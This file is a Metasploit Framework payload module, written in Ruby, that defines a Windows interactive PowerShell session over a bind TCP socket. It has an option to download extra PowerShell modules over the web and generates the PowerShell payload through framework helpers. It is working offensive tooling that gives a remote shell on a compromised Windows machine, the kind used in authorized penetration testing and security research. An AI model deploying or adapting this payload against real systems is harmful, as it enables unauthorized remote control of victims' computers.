##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/handler/bind_tcp'
require 'msf/base/sessions/powershell'
require 'msf/core/payload/windows/powershell'
require 'msf/core/handler/bind_tcp'

module MetasploitModule

  CachedSize = 1553

  include Msf::Payload::Single
  include Rex::Powershell::Command
  include Msf::Payload::Windows::Powershell

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Windows Interactive Powershell Session, Bind TCP',
      'Description'   => 'Interacts with a powershell session on an established socket connection',
      'Author'        => [
          'Ben Turner', # benpturner
          'Dave Hardy' # davehardy20
        ],
      'References'    => [
          ['URL', 'https://www.nettitude.co.uk/interactive-powershell-session-via-metasploit/']
        ],
      'License'       => MSF_LICENSE,
      'Platform'      => 'windows',
      'Arch'          => ARCH_CMD,
      'Handler'       => Msf::Handler::BindTcp,
      'Session'       => Msf::Sessions::PowerShell,
      'RequiredCmd'   => 'generic',
      'Payload'       => { 'Payload' => '' }
      ))
      register_options( [
        OptString.new('LOAD_MODULES', [ false, "A list of powershell modules separated by a comma to download over the web", nil ]),
      ])
  end

  def generate
    generate_powershell_code("Bind")
  end
end
